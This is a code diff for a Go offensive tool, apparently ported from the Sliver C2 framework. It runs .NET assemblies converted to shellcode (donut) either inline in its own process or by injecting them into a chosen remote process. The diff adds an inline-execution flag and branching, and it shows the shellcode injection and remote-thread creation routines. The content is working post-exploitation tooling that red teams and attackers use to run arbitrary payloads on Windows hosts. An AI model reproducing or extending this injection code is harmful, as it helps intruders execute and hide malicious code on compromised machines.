@@ -23,9 +23,12 @@ var (
 	// kernel32dllPath = "C:\\Windows\\System32\\kernel32.dll"
 	CurrentToken    windows.Token
 	help = flag.Bool("help", false, "Show help")
+	inlineFlag = flag.Bool("inline", false, "Execute Assembly in current process")
 	filepath string
 	arguments string
 	process string
+	inline bool
+	
 )
 
 func parseFlags() {
@@ -37,6 +40,10 @@ func parseFlags() {
 	if *help {
 		flag.Usage()
 		os.Exit(0)
+	}
+
+	if *inlineFlag {
+		inline = true
 	}
 
 	if len(filepath) == 0 {
@@ -79,15 +86,26 @@ func main() {
 	log.Printf("Assembly Path supplied: %v\n", assemblyPath)
 	log.Printf("Assembly Bin size: %v\n", len(assemblyBytes))
 	log.Printf("Assembly Args supplied: %v\n", assemblyArgsStr)
-	log.Printf("Process supplied: %v\n", process)
-
-	resp, err := ExecuteInlineAssembly(donutBytes)
-	if err != nil {
-		fmt.Printf("%s", err)
-		return
+	if inline != true {
+		log.Printf("Process supplied: %v\n", process)
 	}
+	log.Printf("Inline Execution: %v\n", inline)
 
-	fmt.Println(resp)
+	if inline == true {
+		resp, err := ExecuteInlineAssembly(donutBytes)
+		if err != nil {
+			fmt.Printf("%s", err)
+			return
+		}
+		fmt.Println(resp)
+	} else {
+		resp, err := ExecuteAssembly(donutBytes, process)
+		if err != nil {
+			fmt.Printf("%s", err)
+			return
+		}
+		fmt.Println(resp)
+	}
 }
 
 // Execute Assembly in the current process
@@ -95,26 +113,14 @@ func ExecuteInlineAssembly(data []byte) (string, error) {
 	var (
 		stdoutBuf, stderrBuf bytes.Buffer
 	)
-	// defer windows.CloseHandle(handle)
-	// defer windows.CloseHandle(lpTargetHandle)
-	// currentProcHandle, err := windows.GetCurrentProcess()
-	// if err != nil {
-	// 	log.Println("GetCurrentProcess failed")
-	// 	return "", err
-	// }
-	// err = windows.DuplicateHandle(handle, currentProcHandle, currentProcHandle, &lpTargetHandle, 0, false, syscalls.DUPLICATE_SAME_ACCESS)
-	// if err != nil {
-	// 	log.Println("DuplicateHandle failed")
-	// 	return "", err
-	// }
+
 	threadHandle, err := injectInlineTask(data, false)
 	if err != nil {
 		return "", err
 	}
-	err = waitForCompletion(threadHandle)
-	if err != nil {
-		return "", err
-	}
+
+	// Wait for execution to finish
+	_, _ = windows.WaitForSingleObject(windows.Handle(threadHandle), 0xFFFFFFFF)
 
 	return stdoutBuf.String() + stderrBuf.String(), nil
 }
@@ -157,7 +163,7 @@ func injectInlineTask(data []byte, rwxPages bool) (windows.Handle, error) {
 		}
 	}
 	// Create the remote thread to where we wrote the shellcode
-	log.Println("successfully injected data, starting remote thread ....")
+	log.Println("successfully injected data, starting thread ....")
 	
 	attr := new(windows.SecurityAttributes)
 	var lpThreadId uint32
@@ -167,9 +173,9 @@ func injectInlineTask(data []byte, rwxPages bool) (windows.Handle, error) {
 	
 	if err != nil {
 		log.Printf("[!] failed to create remote thread")
-		return threadHandle, err
+		return  threadHandle, err
 	}
-	return threadHandle, nil
+	return  threadHandle, nil
 }
 
 // From Sliver... port to run standalone
